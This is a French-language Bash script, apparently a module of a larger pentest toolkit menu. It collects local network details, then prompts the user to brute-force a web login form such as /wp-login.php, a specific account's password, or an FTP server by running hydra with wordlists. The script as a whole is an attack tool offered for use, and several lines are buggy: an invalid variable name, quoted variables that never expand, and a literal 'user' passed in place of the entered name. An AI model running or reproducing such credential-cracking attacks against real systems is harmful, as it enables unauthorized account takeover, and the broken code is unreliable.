## Couleurs BASH
DEFAULT="\e[00m"
BLACK="\e[30m"
RED="\e[31m"
GREEN="\e[32m"
ORANGE="\e[33m"
BLUE="\e[34m"
MAGENTA="\e[35m"
CYAN="\e[36m"
WHITE="\e[37m"

## Effets de texte (défaut, gras, souligné)
export DEF="\e[0;0m"
export BOLD="\e[1m"
export UNDER="\e[4m"


eth0=`ifconfig | grep -v -i "ether" | awk {'print $1'} | sed "s/.$//" | grep "eth" | tail -1` > /dev/null 2>&1
wlan0=`ifconfig | awk {'print $1'} | sed "s/.$//" | grep "wlan" | tail -1` > /dev/null 2>&1
IPeth0=`ifconfig $eth0 | grep -w "inet" | awk '{print $2}'` > /dev/null 2>&1
IPwlan0=`ifconfig $wlan0 | grep -w "inet" | awk '{print $2}'` > /dev/null 2>&1
if [ -z $wlan0 ];then
	if [ -z $IPeth0 ];then
		interface="lo"
	else
		interface=$eth0
	fi
else
	interface=$wlan0
fi
ipprivee=`ifconfig $interface | grep -w "inet" | awk '{print $2}'` > /dev/null 2>&1
ippublique=`wget http://checkip.dyndns.org -O - -o /dev/null | cut -d : -f 2 | cut -d \< -f 1` > /dev/null 2>&1
gateway=`ip route | grep "default" | awk {'print $3'}` > /dev/null 2>&1
session=`hostname`
iprange=`ip route | grep "kernel" | awk {'print $1'}` > /dev/null 2>&1
path=`pwd`


trap ctrl_c INT
ctrl_c() {
echo "" && echo ""
echo -e -n "$MAGENTA [>]$CYAN Appuiez sur ENTRÉE pour afficher les options.$DEFAULT"
read -e -p "
" -n 1 -s
cd
cd $path/../
./suite.sh
}


echo -e -n "$MAGENTA [>]$CYAN Que voulez-vous craquer ? (login / pwd / ftp) : $DEFAULT"
read type

case $type in
	login) {
			echo -e -n "$MAGENTA [>]$CYAN Entrez l'IP du site : $DEFAULT"
			read IP

			wordlist=$(zenity --title "Choisissez la wordlist des noms d'utilisateurs à utiliser" --filename=$path --file-selection --text "Choisissez la wordlist à utiliser.") > /dev/null 2>&1
			
			echo -e -n "$MAGENTA [>]$CYAN Entrez le lien de lapage contenant le formulaire (/wp-login.php) : $DEFAULT"
			read page

			echo -e -n "$MAGENTA [>]$CYAN Entrez la ligne de variable BurpSuite (dernière ligne de l'intercept) : $DEFAULT"
			read log-vars

			echo -e "$BLUE [...]$CYAN Lancement de l'attaque... $DEFAULT
"

			hydra -V -L $wordlist -p 123 $IP http-post-form '$page:$log-vars:F=Invalid username'
		};;
	pwd) {
			echo -e -n "$MAGENTA [>]$CYAN Entrez l'IP du site : $DEFAULT"
			read IP

			echo -e -n "$MAGENTA [>]$CYAN Entrez le nom d'utilisateur de compte à craquer : $DEFAULT"
			read user

			wordlist=$(zenity --title "Choisissez la wordlist des passwords à utiliser" --filename=$path --file-selection --text "Choisissez la wordlist à utiliser.") > /dev/null 2>&1
			
			echo -e -n "$MAGENTA [>]$CYAN Entrez le lien de lapage contenant le formulaire (Ex : /wp-login.php) : $DEFAULT"
			read page

			echo -e -n "$MAGENTA [>]$CYAN Entrez la ligne de variable BurpSuite (dernière ligne de l'intercept) : $DEFAULT"
			read log-vars

			echo -e "$BLUE [...]$CYAN Lancement de l'attaque... $DEFAULT
"

			hydra -V -l user -P $wordlist $IP http-post-form '$page:$log-vars:F=Invalid username'
		};;
	ftp) {
			echo -e -n "$MAGENTA [>]$CYAN Entrez l'IP du serveur ftp : $DEFAULT"
			read IP
			
			echo -e -n "$MAGENTA [>]$CYAN Entrez le nom d'utilisateur du compte ftp : $DEFAULT"
			read user

			wordlist=$(zenity --title "Choisissez la wordlist à utiliser" --filename=$path --file-selection --text "Choisissez la wordlist à utiliser.") > /dev/null 2>&1
			
			echo -e "$BLUE [...]$CYAN Lancement de l'attaque... $DEFAULT
"
			hydra -V -l $user -P $wordlist ftp://$IP
		};;
esac

echo ""
echo -e -n "$MAGENTA [>]$CYAN Appuiez sur ENTRÉE pour afficher les options.$DEFAULT"
read -e -p "
" -n 1 -s



cd
cd $path/../
./suite.sh
